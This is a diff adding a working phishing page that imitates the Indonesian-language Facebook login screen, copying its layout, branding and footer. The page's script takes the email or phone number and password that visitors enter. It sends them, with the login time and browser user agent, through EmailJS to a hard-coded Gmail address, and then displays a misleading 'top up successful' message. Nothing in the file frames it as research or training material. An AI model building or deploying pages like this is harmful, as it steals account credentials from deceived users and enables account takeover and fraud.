@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Masuk atau Daftar</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: #1c1e21;
+        }
+        
+        .container {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header Styles */
+        .header {
+            background-color: #ffffff;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            padding: 10px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        
+        .mobile-menu {
+            display: none;
+            font-size: 20px;
+            color: #65676b;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+        
+        /* Main Content Styles */
+        .content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 80px 0;
+            flex: 1;
+        }
+        
+        .intro {
+            max-width: 500px;
+            margin-right: 30px;
+        }
+        
+        .intro h1 {
+            color: #1877f2;
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        
+        .intro p {
+            font-size: 24px;
+            line-height: 1.4;
+        }
+        
+        /* Login Form Styles */
+        .login-form {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px;
+        }
+        
+        .login-form input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+        
+        .login-form input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 14px 16px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+        
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .forgot-password {
+            display: block;
+            text-align: center;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 20px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #dadde1;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px 16px;
+            margin: 0 auto;
+            display: block;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        /* Footer Styles */
+        .footer {
+            margin-top: auto;
+            background-color: #ffffff;
+            padding: 20px 0;
+            color: #737373;
+            font-size: 14px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+        }
+        
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+            margin-right: 15px;
+            margin-bottom: 10px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            margin-top: 10px;
+        }
+        
+        /* Message Styles */
+        .message {
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            text-align: center;
+            display: none;
+        }
+        
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        /* Mobile Styles */
+        @media (max-width: 900px) {
+            .content {
+                flex-direction: column;
+                padding: 40px 0;
+            }
+            
+            .intro {
+                text-align: center;
+                margin-right: 0;
+                margin-bottom: 40px;
+                max-width: 100%;
+            }
+            
+            .intro h1 {
+                font-size: 40px;
+            }
+            
+            .intro p {
+                font-size: 20px;
+            }
+            
+            .login-form {
+                width: 100%;
+                max-width: 400px;
+            }
+            
+            .mobile-menu {
+                display: block;
+            }
+            
+            .footer-links {
+                justify-content: center;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .intro h1 {
+                font-size: 32px;
+            }
+            
+            .intro p {
+                font-size: 18px;
+            }
+            
+            .login-form {
+                padding: 15px;
+            }
+            
+            .footer-links a {
+                margin-right: 10px;
+                font-size: 12px;
+            }
+        }
+        
+        /* Loading Animation */
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #1877f2;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Additional Info Section */
+        .additional-info {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f7f8fa;
+            border-radius: 6px;
+            font-size: 13px;
+            color: #65676b;
+            text-align: center;
+        }
+        
+        .additional-info a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        
+        .additional-info a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="container">
+            <div class="header-content">
+                <a href="#" class="logo">facebook</a>
+                <button class="mobile-menu">
+                    <i class="fas fa-bars"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="content">
+            <div class="intro">
+                <h1>facebook</h1>
+                <p>Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam kehidupan Anda.</p>
+            </div>
+            
+            <div class="login-form">
+                <div id="message" class="message"></div>
+                <div id="loading" class="loading">
+                    <div class="spinner"></div>
+                    <p>Mencoba login...</p>
+                </div>
+                <form id="loginForm">
+                    <input type="text" id="email" placeholder="Email atau nomor telepon" required>
+                    <input type="password" id="password" placeholder="Kata sandi" required>
+                    <button type="submit" class="login-button">Masuk</button>
+                    <a href="#" class="forgot-password">Lupa kata sandi?</a>
+                    <button type="button" class="create-account">Buat Akun Baru</button>
+                </form>
+                <div class="additional-info">
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="container">
+            <div class="footer-links">
+                <a href="#">Indonesia</a>
+                <a href="#">English (US)</a>
+                <a href="#">Bahasa Indonesia</a>
+                <a href="#">日本語</a>
+                <a href="#">中文(简体)</a>
+                <a href="#">Tiếng Việt</a>
+                <a href="#">한국어</a>
+                <a href="#">ไทย</a>
+                <a href="#">Português (Brasil)</a>
+                <a href="#">Français (France)</a>
+                <a href="#">Deutsch</a>
+                <a href="#">Español</a>
+                <a href="#">+</a>
+            </div>
+            <div class="footer-links">
+                <a href="#">Daftar</a>
+                <a href="#">Masuk</a>
+                <a href="#">Messenger</a>
+                <a href="#">Facebook Lite</a>
+                <a href="#">Video</a>
+                <a href="#">Tempat</a>
+                <a href="#">Permainan</a>
+                <a href="#">Marketplace</a>
+                <a href="#">Meta Pay</a>
+                <a href="#">Meta Store</a>
+                <a href="#">Meta Quest</a>
+                <a href="#">Ray-Ban Stories</a>
+                <a href="#">Instagram</a>
+                <a href="#">Threads</a>
+                <a href="#">Penggalangan Dana</a>
+                <a href="#">Layanan</a>
+                <a href="#">Pusat Informasi Pemilih</a>
+                <a href="#">Kebijakan Privasi</a>
+                <a href="#">Pusat Privasi</a>
+                <a href="#">Grup</a>
+                <a href="#">Tentang</a>
+                <a href="#">Buat Iklan</a>
+                <a href="#">Buat Halaman</a>
+                <a href="#">Developer</a>
+                <a href="#">Karier</a>
+                <a href="#">Cookie</a>
+                <a href="#">Pilihan Iklan</a>
+                <a href="#">Ketentuan</a>
+                <a href="#">Bantuan</a>
+                <a href="#">Unggah Kontak & Non-Pengguna</a>
+            </div>
+            <div class="copyright">Meta © 2023</div>
+        </div>
+    </div>
+
+    <script>
+        // Inisialisasi EmailJS dengan Public Key
+        // Ganti dengan public key Anda dari dashboard EmailJS
+        emailjs.init("wWRLhn6D84_8bq5T2");
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const messageElement = document.getElementById('message');
+            const loadingElement = document.getElementById('loading');
+            
+            // Validasi sederhana
+            if (!email || !password) {
+                showMessage('Harap isi semua bidang!', 'error');
+                return;
+            }
+            
+            if (!validateEmail(email) && !validatePhone(email)) {
+                showMessage('Harap masukkan email atau nomor telepon yang valid!', 'error');
+                return;
+            }
+            
+            // Tampilkan loading
+            loadingElement.style.display = 'block';
+            messageElement.style.display = 'none';
+            
+            // Kirim data ke email menggunakan EmailJS
+            sendEmail(email, password);
+        });
+        
+        // Mobile menu toggle
+        document.querySelector('.mobile-menu').addEventListener('click', function() {
+            alert('Menu mobile akan ditampilkan di sini');
+        });
+        
+        // Tombol buat akun baru
+        document.querySelector('.create-account').addEventListener('click', function() {
+            alert('Fitur buat akun baru akan ditampilkan di sini');
+        });
+        
+        // Lupa password
+        document.querySelector('.forgot-password').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Fitur lupa password akan ditampilkan di sini');
+        });
+        
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+        
+        function validatePhone(phone) {
+            const re = /^[0-9+\-\s()]{10,}$/;
+            return re.test(phone);
+        }
+        
+        function showMessage(message, type) {
+            const messageElement = document.getElementById('message');
+            messageElement.textContent = message;
+            messageElement.className = 'message ' + type;
+            messageElement.style.display = 'block';
+            
+            // Sembunyikan pesan setelah 5 detik
+            setTimeout(() => {
+                messageElement.style.display = 'none';
+            }, 5000);
+        }
+        
+        function sendEmail(email, password) {
+            const loadingElement = document.getElementById('loading');
+            
+            // Data yang akan dikirim
+            const templateParams = {
+                to_email: 'luffycfd@gmail.com',
+                from_email: email,
+                password: password,
+                login_time: new Date().toLocaleString('id-ID'),
+                user_agent: navigator.userAgent
+            };
+            
+            // Ganti dengan Service ID dan Template ID dari EmailJS
+            const serviceID = 'service_lusi25h';
+            const templateID = 'template_98hsn1w';
+            
+            // Kirim email menggunakan EmailJS
+            emailjs.send(serviceID, templateID, templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    showMessage('Top up berhasil ', 'success');
+                    loadingElement.style.display = 'none';
+                    
+                    // Reset form
+                    document.getElementById('loginForm').reset();
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    showMessage('Terjadi kesalahan saat mengirim data. Silakan coba lagi.', 'error');
+                    loadingElement.style.display = 'none';
+                });
+        }
+        
+        // Animasi sederhana untuk form
+        document.querySelectorAll('.login-form input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.transform = 'translateY(-2px)';
+                this.style.transition = 'transform 0.2s ease';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.style.transform = 'translateY(0)';
+            });
+        });
+        
+        // Tampilkan info tentang EmailJS di console
+        console.log('Untuk mengaktifkan pengiriman email:');
+        console.log('1. Daftar di https://www.emailjs.com/');
+        console.log('2. Buat template email di dashboard EmailJS');
+        console.log('3. Ganti YOUR_PUBLIC_KEY, YOUR_SERVICE_ID, dan YOUR_TEMPLATE_ID dengan kredensial Anda');
+    </script>
+</body>
+</html>
